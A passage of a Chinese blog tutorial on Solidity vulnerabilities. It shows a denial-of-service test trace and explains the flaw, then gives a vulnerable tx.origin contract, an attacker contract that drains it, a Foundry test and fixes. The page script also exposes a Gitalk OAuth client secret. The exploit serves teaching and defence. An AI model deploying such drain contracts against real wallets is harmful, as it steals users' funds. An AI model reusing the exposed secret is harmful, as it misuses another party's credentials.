+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs tex">Ran 1 test for test/DOSAttack/DOSAttackTest.t.sol:DOSAttackTest<br>[FAIL. Reason: EvmError: Revert] testDOSAttack() (gas: 226197)<br>Traces:<br>  [299279] DOSAttackTest::setUp()<br>    ├─ [100147] → new Distribute@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f<br>    │   └─ ← [Return] 500 bytes of code<br>    ├─ [107284] → new DOSAttacker@0x2e234DAe75C793f67A35089C9d99245E1C58470b<br>    │   └─ ← [Return] 424 bytes of code<br>    └─ ← [Stop] <br><br>  [226197] DOSAttackTest::testDOSAttack()<br>    ├─ [0] VM::deal(0x0000000000000000000000000000000000000001, 1000000000000000000 [1e18])<br>    │   └─ ← [Return] <br>    ├─ [0] VM::deal(0x0000000000000000000000000000000000000002, 1000000000000000000 [1e18])<br>    │   └─ ← [Return] <br>    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000001)<br>    │   └─ ← [Return] <br>    ├─ [88624] Distribute::invest&#123;value: 10000000000000000&#125;()<br>    │   └─ ← [Stop] <br>    ├─ [0] VM::stopPrank()<br>    │   └─ ← [Return] <br>    ├─ [54256] DOSAttacker::invest&#123;value: 100000000000000000&#125;()<br>    │   ├─ [44824] Distribute::invest&#123;value: 100000000000000000&#125;()<br>    │   │   └─ ← [Stop] <br>    │   └─ ← [Stop] <br>    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000001)<br>    │   └─ ← [Return] <br>    ├─ [44824] Distribute::invest&#123;value: 10000000000000000&#125;()<br>    │   └─ ← [Stop] <br>    ├─ [0] VM::stopPrank()<br>    │   └─ ← [Return] <br>    ├─ [2280] Distribute::distribute()<br>    │   └─ ← [Revert] EvmError: Revert<br>    └─ ← [Revert] EvmError: Revert<br><br>Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 509.88µs (99.42µs CPU time)<br></code></pre></td></tr></table></figure>
+<p>1:请注意，合约遍历的数组可以认为的扩充，攻击者可以创建大量用户，让<code>investors</code>数据变得更大，原则上来说，可以让执行for循环所需要的gas超过区块Gas上限，这会使<code>distribute()</code>函数变得无法操作。</p>
+<p>2:所有者操作，常见的模式时所有者在合约中有特定权限，必须执行一些任务才能使合约进入下一个状态，例如，ICO合约要求所有者<code>owner</code>签订合约，才可以转让代币。</p>
+<p>3：攻击者合约中没有<code>receive()</code>不能接收以太坊，这会导致被攻击合约中的资产永远被锁在合约中。</p>
+<h3 id="预防技术-1"><a href="#预防技术-1" class="headerlink" title="预防技术"></a>预防技术</h3><p>1:合约不应该遍历可以被外部用户认为操纵的数据结构，建议使用withdraw 模式，每个投资者都会调用取出函数独立取出代币。</p>
+<p>2:改变合约的状态需要权限用户，在这样的例子中如果<code>owner</code>已经瘫痪或者私钥被盗，可以使用自动防故障模式。</p>
+<p>​    1:将<code>owner</code>设为一个多签合约，</p>
+<p>​    2:使用时间锁，指定一段时间后，任何用户都可以调用函数，完成合约。</p>
+<h2 id="Tx-Origin-用作身份验证"><a href="#Tx-Origin-用作身份验证" class="headerlink" title="Tx.Origin 用作身份验证"></a>Tx.Origin 用作身份验证</h2><p>Solidity中有一个全局变量<code>tx.origin</code>,它遍历整个调用栈并返回最初发送交易和调用的账户地址，在智能合约中使用此变量进行身份验证会使合约容易收到此类网络钓鱼的攻击。</p>
+<h3 id="漏洞-2"><a href="#漏洞-2" class="headerlink" title="漏洞"></a>漏洞</h3><p>授权用户使用<code>tx.origin</code>变量的合约通常容易受到网络钓鱼攻击的攻击，这可能会诱骗用户在有漏洞的合约上执行身份验证操作。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Phishable &#123;<br>    address public owner;<br>    <br>    constructor (address _owner) &#123;<br>        owner = _owner; <br>    &#125;<br>    <br>    function () public payable &#123;&#125; // collect ether<br><br>    function withdrawAll(address _recipient) public &#123;<br>        require(tx.origin == owner);<br>        _recipient.transfer(this.balance); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>攻击合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract AttackPhishable &#123;<br><br>    address public impl;<br>    address public owner;<br><br>    constructor( address _impl, address _owner) &#123;<br>        impl = _impl;<br>        owner = _owner;<br>    &#125;<br><br>    receive() external payable &#123;<br>        (bool success, ) = impl.call(abi.encodeWithSignature(&quot;withdrawAll(address)&quot;, owner));<br>        require(success);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Test 模拟攻击合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &#123;Test, console&#125; from &quot;forge-std/Test.sol&quot;;<br><br>import &#123;Phishable&#125; from &quot;../../src/TxOrigin/Phishable.sol&quot;;<br>import &#123;AttackPhishable&#125; from &quot;../../src/TxOrigin/AttackPhishable.sol&quot;;<br><br>contract ReentrancyAttackTest is Test &#123;<br>    Phishable public phishable;<br>    AttackPhishable public attack;<br>    address public owner = address(0x9);<br>    address public attacker = address(0xA);<br><br>    function setUp() public &#123;<br>        deal(owner, 2 ether);<br>        vm.startPrank(owner);<br>        phishable = new Phishable(owner);<br>        vm.stopPrank();<br>        attack = new AttackPhishable(address(phishable), attacker);<br>    &#125;<br><br>    function testAttack() public &#123;<br>        assert(phishable.owner() == owner);<br>        // 往被攻击合约中转入1 个以太坊<br>        payable(address(phishable)).transfer(1 ether);<br>        // 钓鱼合约调用被攻击合约的withdrawAll方法<br>        vm.startPrank(owner, owner);<br>        (bool success, ) = payable(address(attack)).call&#123;value: 0.001 ether&#125;(<br>            &quot;&quot;<br>        );<br>        require(success);<br>        vm.stopPrank();<br>        console.log(&quot;phishable balance: &quot;, address(phishable).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>要利用<code>AttackPhishable</code>,攻击者会先部署它，然后说服<code>Phishable</code>合约的所有者发送一定数量的ETH到这个恶意合约，攻击者可能把这个合约伪装成他们的私人地址，或者对受害人进行社会工程学攻击，然后后者发送某种形式的交易。</p>
+<p>只要受害者向<code>AttackPhishable</code> 地址发送了一个交易且有足够的gas，它将调用<code>receive</code>函数，然后调用<code>Phishable</code>合约中的<code>withdrawAll</code>函数，这将导致所有资金从<code>Phishable</code>合约转到攻击者账户中。因此，<code>tx.origin</code>将等于<code>owner</code>。</p>
+<h3 id="预防技术-2"><a href="#预防技术-2" class="headerlink" title="预防技术"></a>预防技术</h3><p><code>tx.origin</code>不应该用于智能合约授权。这并不是说该<code>tx.origin</code>变量不应该被使用，它确实在智能合约中有一些合法用例，例如，如果有人想要拒绝外部合约调用当前合约，他们可以实现一个从<code>require(tx.origin == msg.sender)</code>中实现这一要求。</p>
+
+
+        <hr>
+        <!-- Pager -->
+        <ul class="pager">
+          
+          
+          <li class="next">
+            <a href="/en/Contract_Report/" data-toggle="tooltip" data-placement="top" title="智能合约中常见的漏洞和优化Gas">Next Post &rarr;</a>
+          </li>
+          
+        </ul>
+
+        
+        <!-- tip start -->
+        <!-- tip -->
+<!-- tip start -->
+<div class="tip">
+  <p>
+    
+      If you like this blog or find it useful for you, you are welcome to comment on it. You are also welcome to share this blog, so that more people can participate in it. If the images used in the blog infringe your copyright, please contact the author to delete them. Thank you !
+    
+  </p>
+</div>
+<!-- tip end -->
+
+        <!-- tip end -->
+        
+
+        
+        <!-- Sharing Srtart -->
+        <!-- Social Social Share Post -->
+<!-- Docs:https://github.com/overtrue/share.js -->
+
+<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
+  <ul class="list-inline text-center social-share-ul">
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-twitter">
+        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a class="social-share-icon icon-wechat">
+        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-weibo">
+        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-qq">
+        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=Solidity 安全：已知攻击方法和常见防御模式综合列表&body=Hi,I found this website and thought you might like it http://yoursite-url/en/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns_zh-cn/">
+        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+<!-- css & js -->
+<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
+<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+        <!-- Sharing End -->
+        
+        <hr>
+
+        <!-- comments start -->
+        <!-- 1. gitalk comment -->
+
+  <!-- gitalk start -->
+  <!-- Docs:https://github.com/gitalk/gitalk/blob/master/readme-cn.md -->
+
+  <div id="gitalk-container"></div>
+
+  
+    <!-- <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.js"></script> -->
+    <script src="/js/comment/gitalk.js"></script>
+  
+
+  <script>
+    var gitalk = new Gitalk({
+      clientID: '8d34cec04e51a507b217',
+      clientSecret: 'dbd95dbedb6676efc06c083311491ed110f98fd5',
+      repo: 'openskyx.github.io',
+      owner: 'OpenSkyX',
+      admin: 'OpenSkyX',
+      id: 'Sat May 11 2024 01:20:17 GMT+0800', // Ensure uniqueness and length less than 50
+      distractionFreeMode: false, // Facebook-like distraction free mode
+      perPage: 10,
+      pagerDirection: 'last',
+      createIssueManually: false,
+      language: 'en',
+      proxy: 'https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token'
+    });
+    gitalk.render('gitalk-container');
+
+    var gtFolded = () => {
+      setTimeout(function () {
+        let markdownBody = document.getElementsByClassName("markdown-body");
+        let list = Array.from(markdownBody);
+        list.forEach(item => {
+          if (item.clientHeight > 250) {
+            item.classList.add('gt-comment-body-folded');
+            item.style.maxHeight = '250px';
+            item.title = 'Click to Expand';
+            item.onclick = function () {
+              item.classList.remove('gt-comment-body-folded');
+              item.style.maxHeight = '';
+              item.title = '';
+              item.onclick = null;
+            };
+          }
+        })
+      }, 800);
+    }
+  </script>
+
+  <!-- gitalk end -->
+
+
+<!-- 2. gitment comment -->
+
+
+<!-- 3. disqus comment -->
+
+
+        <!-- comments end -->
+        <hr>
+
+      </div>
+
+      <!-- Catalog: Tabe of Content -->
+      <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Solidity-%E5%AE%89%E5%85%A8%EF%BC%9A%E5%B7%B2%E7%9F%A5%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E5%92%8C%E5%B8%B8%E8%A7%81%E9%98%B2%E5%BE%A1%E6%A8%A1%E5%BC%8F%E7%BB%BC%E5%90%88%E5%88%97%E8%A1%A8"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Solidity 安全：已知攻击方法和常见防御模式综合列表</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">重入漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">漏洞</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%84%E9%98%B2%E6%8A%80%E6%9C%AF"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">预防技术</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BF%AE%E5%A4%8D%E5%90%88%E7%BA%A6"><span class="toc-nav-number">1.1.3.</span> <span class="toc-nav-text">修复合约</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%EF%BC%88DOS%EF%BC%89"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">拒绝服务（DOS）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E-1"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">漏洞</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%84%E9%98%B2%E6%8A%80%E6%9C%AF-1"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">预防技术</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Tx-Origin-%E7%94%A8%E4%BD%9C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">Tx.Origin 用作身份验证</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E-2"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">漏洞</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A2%84%E9%98%B2%E6%8A%80%E6%9C%AF-2"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">预防技术</span></a></li></ol></li></ol></li></ol>
+        
+        </div>
+      </aside>
+    
+
+
+
+      <!-- Sidebar Container -->
+      <div class="
+                col-lg-8 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+        <!-- Featured Tags -->
+        
+        <section>
+          <!-- no hr -->
+          <h5>
+            <a href="/tags/">FEATURED TAGS</a>
+          </h5>
+          <div class="tags">
+            
+            <a class="tag" href="/tags/#Solidity 安全" title="Solidity 安全">Solidity 安全</a>
+            
+          </div>
+        </section>
+        
+
+        <!-- Friends Blog -->
+        
+        <hr>
+        <h5>FRIENDS</h5>
+        <ul class="list-inline">
+
+          
+        </ul>
+        
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+<!-- anchorjs start -->
+<!-- async load function -->
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script type="text/javascript">
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function(e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  };
+</script>
+<script type="text/javascript">
+  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
+  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
+    anchors.options = {
+      visible: 'hover',
+      placement: 'left',
+      // icon: 'ℬ'
+      icon: '❡'
+    };
+    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+  });
+</script>
+<style>
+  /* place left on bigger screen */
+  @media all and (min-width: 800px) {
+    .anchorjs-link {
+      position: absolute;
+      left: -0.75em;
+      font-size: 1.1em;
+      margin-top: -0.1em;
+    }
+  }
+</style>
+
+<!-- anchorjs end -->
+
+
+
+		<!-- Footer (contains ThemeColor、viewer) -->
+		<!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center">
+          
+
+          
+            <li>
+              <a target="_blank" href="https://github.com/OpenSkyX">
+                <span class="fa-stack fa-lg">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+          
+
+          
+            <li>
+              <a target="_blank" href="https://twitter.com/XMaxio">
+                <span class="fa-stack fa-lg">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+        </ul>
+        <p class="copyright text-muted">
+          Copyright &copy;
+          Mr. Alex
+          2024
+          <br>
+          <!-- Theme by
+          <a target="_blank" rel="noopener" href="http://beantech.org">BeanTech</a>
+          <span style="display: inline-block; margin: 0 5px;">
+            <i class="fa fa-heart"></i>
+          </span>
+          re-Ported by
+          <a target="_blank" rel="noopener" href="https://v-vincen.life/">Live My Life</a>
+          |
+          <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="91px" height="20px" src="https://ghbtns.com/github-btn.html?user=V-Vincen&repo=V-Vincen.github.io&type=star&count=true"></iframe> -->
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<a id="rocket" href="#top" class=""></a>
+
+
+  <!-- jQuery -->
+  <script type="text/javascript" src="/js/jquery.min.js"></script>
+  <!-- Bootstrap Core JavaScript -->
+  <script type="text/javascript" src="/js/bootstrap.min.js"></script>
+  <!-- Custom Theme JavaScript -->
+  <script type="text/javascript" src="/js/hux-blog.min.js"></script>
+  <!-- catalog -->
+  <script async="true" type="text/javascript" src="/js/catalog.js"></script>
+  <!-- totop(rocket) -->
+  <script async="true" type="text/javascript" src="/js/totop.js"></script>
+
+  
+    <!-- Busuanzi JavaScript -->
+    <script async="async" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <!-- Scroll start -->
+    <script async="async" type="text/javascript" src="/js/scroll.js"></script>
+    <!-- Scroll end -->
+  
+
+  
+
+  
+    <!-- Mouseclick -->
+    <script type="text/javascript" src="/js/mouseclick.js" content='The first step is as good as half over...,Laugh and grow fat...,Man proposes God disposes...,When all else is lost the future still remains...,Wasting time is robbing oneself...,Sharp tools make good work...,Cease to struggle and you cease to live...,A friend in need is a friend indeed...,Faith can move mountains...' color='#9933CC,#339933,#66CCCC,#FF99CC,#CCCCFF,#6666CC,#663399,#66CC99,#FF0033'></script>
+  
+
+  
+    <!-- ribbon -->
+    <script type="text/javascript" src="/js/ribbonDynamic.js"></script>
+  
+
+  
+
+
+
+
+
+
+  <!-- viewer start -->
+  <!-- viewer start (Picture preview) -->
+  
+    <script async="async" type="text/javascript" src="/js/viewer/viewer.min.js"></script>
+    <script async="async" type="text/javascript" src="/js/viewer/pic-viewer.js"></script>
+  
+
+  <!-- viewer end -->
+
+
+<script>
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function (e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  // fastClick.js
+  async ("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function () {
+    var $nav = document.querySelector("nav");
+    if ($nav)
+      FastClick.attach($nav);
+    }
+  )
+</script>
+
+<!-- Because of the native support for backtick-style fenced code blocks right within the Markdown is landed in Github Pages, From V1.6, There is no need for Highlight.js, so Huxblog drops it officially. -
+https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0 - https://help.github.com/articles/creating-and-highlighting-code-blocks/ -->
+<!-- <script> async ("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function () { hljs.initHighlightingOnLoad(); }) </script> <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet"> -->
+
+<!-- jquery.tagcloud.js -->
+<!-- <script> // only load tagcloud.js in tag.html if ($('#tag_cloud').length !== 0) { async ("http://yoursite-url/js/jquery.tagcloud.js", function () { $.fn.tagcloud.defaults = { // size: { start: 1, end: 1, unit: 'em' }, color: {
+start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </script> -->
+
+
+		<!-- Search -->
+		
+		<div class="popup search-popup local-search-popup">
+  <span class="popup-btn-close">
+    ESC
+  </span>
+  <div class="container">
+    <div class="row">
+      <!-- <div class="col-md-9 col-md-offset-1"> -->
+      <div class="col-lg-9 col-lg-offset-1 col-md-10 col-md-offset-1 local-search-content">
+
+        <div class="local-search-header clearfix">
+
+          <div class="local-search-input-wrapper">
+            <span class="search-icon">
+              <i class="fa fa-search fa-lg" style="margin: 25px 10px 25px 20px;"></i>
+            </span>
+            <input autocomplete="off" placeholder="SEARCH..." type="text" id="local-search-input">
+          </div>
+        </div>
+        <div id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+  
+    <script src="/js/ziploader.js"></script>
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    // monitor main search box;
+    var onPopupClose = function (e) {
+      $('.popup').fadeOut(300);
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $('.popup').fadeIn(300);
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+    // get search zip version
+    $.get('/searchVersion.json?t=' + (+new Date()), function (res) {
+      if (localStorage.getItem('searchVersion') !== res) {
+        localStorage.setItem('searchVersion', res);
+        initSearchJson();
+      }
+    });
+
+    function initSearchJson() {
+      initLoad(['/search.flv'], {
+        loadOptions: {
+          success: function (obj) {
+            localStorage.setItem('searchJson', obj['search.json'])
+          },
+          error: function (e) {
+            return console.log(e)
+          }
+        },
+        returnOptions: {
+          'json': TYPE_TEXT
+        },
+        mimeOptions: {
+          'json': 'application/json'
+        }
+      })
+    }
+    // search function;
+    var searchFunc = function (search_id, content_id) {
+      'use strict';
+      isfetched = true;
+      var datas = JSON.parse(localStorage.getItem('searchJson'));
+      // console.log(search_id)
+      var input = document.getElementById(search_id);
+      var resultContent = document.getElementById(content_id);
+      var inputEventFunction = function () {
+        var searchText = input.value.trim().toLowerCase();
+        var keywords = searchText.split(/[\s\-]+/);
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        var resultItems = [];
+        if (searchText.length > 0) {
+          // perform local searching
+          datas.forEach(function (data) {
+            var isMatch = false;
+            var hitCount = 0;
+            var searchTextCount = 0;
+            var title = data.title
+              ? data.title.trim()
+              : '';
+            var titleInLowerCase = title.toLowerCase();
+            var content = data.content
+              ? data.content.trim().replace(/<[^>]+>/g, "")
+              : '';
+            var contentInLowerCase = content.toLowerCase();
+            var articleUrl = decodeURIComponent(data.url);
+
+            var date = data.date;
+            var dateTime = date.replace(/T/, " ").replace(/.000Z/, "");
+            var imgUrl = data.header_img;
+            
+
+
+            var indexOfTitle = [];
+            var indexOfContent = [];
+            // only match articles with not empty titles
+            keywords.forEach(function (keyword) {
+              function getIndexByWord(word, text, caseSensitive) {
+                var wordLen = word.length;
+                if (wordLen === 0) {
+                  return [];
+                }
+                var startPosition = 0,
+                  position = [],
+                  index = [];
+                if (!caseSensitive) {
+                  text = text.toLowerCase();
+                  word = word.toLowerCase();
+                }
+                while ((position = text.indexOf(word, startPosition)) > -1) {
+                  index.push({position: position, word: word});
+                  startPosition = position + wordLen;
+                }
+                return index;
+              }
+              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+            });
+            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+              isMatch = true;
+              hitCount = indexOfTitle.length + indexOfContent.length;
+            }
+            // show search results
+            if (isMatch) {
+              // sort index by position of keyword
+              [indexOfTitle, indexOfContent].forEach(function (index) {
+                index.sort(function (itemLeft, itemRight) {
+                  if (itemRight.position !== itemLeft.position) {
+                    return itemRight.position - itemLeft.position;
+                  } else {
+                    return itemLeft.word.length - itemRight.word.length;
+                  }
+                });
+              });
+              // merge hits into slices
+              function mergeIntoSlice(text, start, end, index) {
+                var item = index[index.length - 1];
+                var position = item.position;
+                var word = item.word;
+                var hits = [];
+                var searchTextCountInSlice = 0;
+                while (position + word.length <= end && index.length != 0) {
+                  if (word === searchText) {
+                    searchTextCountInSlice++;
+                  }
+                  hits.push({position: position, length: word.length});
+                  var wordEnd = position + word.length;
+                  // move to next position of hit
+                  index.pop();
+                  while (index.length != 0) {
+                    item = index[index.length - 1];
+                    position = item.position;
+                    word = item.word;
+                    if (wordEnd > position) {
+                      index.pop();
+                    } else {
+                      break;
+                    }
+                  }
+                }
+                searchTextCount += searchTextCountInSlice;
+                return {hits: hits, start: start, end: end, searchTextCount: searchTextCountInSlice};
+              }
+              var slicesOfTitle = [];
+              if (indexOfTitle.length != 0) {
+                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+              }
+              var slicesOfContent = [];
+              while (indexOfContent.length != 0) {
+                var item = indexOfContent[indexOfContent.length - 1];
+                var position = item.position;
+                var word = item.word;
+                // cut out 100 characters
+                var start = position - 20;
+                var end = position + 80;
+                if (start < 0) {
+                  start = 0;
+                }
+                if (end < position + word.length) {
+                  end = position + word.length;
+                }
+                if (end > content.length) {
+                  end = content.length;
+                }
+                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+              }
+              // sort slices in content by search text's count and hits' count
+              slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                  return sliceRight.hits.length - sliceLeft.hits.length;
+                } else {
+                  return sliceLeft.start - sliceRight.start;
+                }
+              });
+              // select top N slices in content
+              var upperBound = parseInt('1');
+              if (upperBound >= 0) {
+                slicesOfContent = slicesOfContent.slice(0, upperBound);
+              }
+              // highlight title and content
+              function highlightKeyword(text, slice) {
+                var result = '';
+                var prevEnd = slice.start;
+                slice.hits.forEach(function (hit) {
+                  result += text.substring(prevEnd, hit.position);
+                  var end = hit.position + hit.length;
+                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                  prevEnd = end;
+                });
+                result += text.substring(prevEnd, slice.end);
+                return result;
+              }
+              var resultItem = '';
+
+              // if (slicesOfTitle.length != 0) {   resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>"; } else {   resultItem += "<li><a target='_blank' href='" +
+              // articleUrl + "' class='search-result-title'>" + title + "</a>"; } slicesOfContent.forEach(function (slice) {   resultItem += "<a target='_blank' href='" + articleUrl + "'><p class=\"search-result\">" + highlightKeyword(content, slice) +
+              // "...</p></a>"; }); resultItem += "</li>";
+
+              if (slicesOfTitle.length != 0) {
